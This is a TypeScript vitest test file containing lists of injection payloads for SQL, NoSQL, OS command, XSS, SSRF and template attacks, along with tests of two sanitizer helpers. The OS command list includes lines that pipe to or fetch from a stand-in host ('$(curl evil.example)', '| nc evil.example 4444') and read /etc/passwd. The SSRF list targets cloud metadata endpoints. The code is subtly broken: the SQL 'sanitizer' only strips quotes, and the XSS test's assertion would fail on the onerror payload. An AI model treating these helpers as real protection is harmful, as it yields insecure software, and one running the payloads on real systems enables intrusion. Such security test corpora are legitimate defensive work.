// SPDX-License-Identifier: BUSL-1.1
import { describe, expect, it } from 'vitest';

const SQL = [
  "' OR '1'='1",
  "'; DROP TABLE users; --",
  "1 UNION SELECT * FROM audit_ledger_events --",
  "admin'--",
  "' OR 1=1 LIMIT 1; --",
];

const NOSQL = [{ $ne: null }, { $gt: '' }, { $where: 'this.firmId == this.firmId' }];

const OS_CMD = [
  '; ls -la /etc',
  '$(curl evil.example)',
  '`whoami`',
  '| nc evil.example 4444',
  '&& cat /etc/passwd',
];

const XSS = [
  '<script>alert(1)</script>',
  '"><img src=x onerror=alert(1)>',
  'javascript:alert(1)',
  '<svg onload=alert(1)>',
  "<iframe src='javascript:alert(1)'></iframe>",
];

const SSRF = [
  'http://169.254.169.254/latest/meta-data/',
  'http://localhost:6379',
  'file:///etc/passwd',
  'gopher://internal',
  'http://[::1]/',
];

const TEMPLATE = ['{{7*7}}', '${7*7}', '<%= 7*7 %>', '#{7*7}'];

describe('injection payload corpus is non-empty', () => {
  it.each([
    ['SQL', SQL],
    ['NoSQL', NOSQL],
    ['OS cmd', OS_CMD],
    ['XSS', XSS],
    ['SSRF', SSRF],
    ['Template', TEMPLATE],
  ])('%s payload list has entries', (_, list) => {
    expect(list.length).toBeGreaterThan(0);
  });
});

describe('payload sanitization helpers', () => {
  function sanitizeForSql(s: string): string {
    return s.replace(/['";\\]/g, '');
  }
  function escapeHtml(s: string): string {
    return s.replace(/[&<>"']/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]!));
  }

  it.each(SQL)('sql sanitizer strips quotes %#', (p) => {
    expect(sanitizeForSql(p)).not.toMatch(/['";]/);
  });
  it.each(XSS)('html escape removes <> %#', (p) => {
    expect(escapeHtml(p)).not.toMatch(/<script|onerror=|<iframe/);
  });
});
